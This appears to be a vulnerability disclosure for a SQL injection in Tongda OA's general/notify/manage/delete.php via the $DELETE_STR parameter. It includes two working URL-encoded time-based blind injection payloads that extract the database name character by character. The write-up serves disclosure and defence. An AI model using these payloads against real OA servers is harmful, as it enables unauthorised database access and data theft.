SQL injection vulnerability exists in Tongda OA front desk

verison:Versions below v11.10, v2017 version

Route: general/notify/manage/delete.php

There is an injected parameter: $DELETE_STR

![image](https://github.com/willchen0011/cve/assets/13689053/569f0bfa-1d98-4d58-93f8-bd4d894f71fd)

The code here is very concise. When $DELETE_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/willchen0011/cve/assets/13689053/d31f79b4-e2ae-4287-9c48-89f25e76440b)

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

And when we change 116 to 115, there will be no delay, indicating the existence of SQL injection.

POC

```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/willchen0011/cve/assets/13689053/bcd07474-0feb-4648-b44f-9033012b1746)
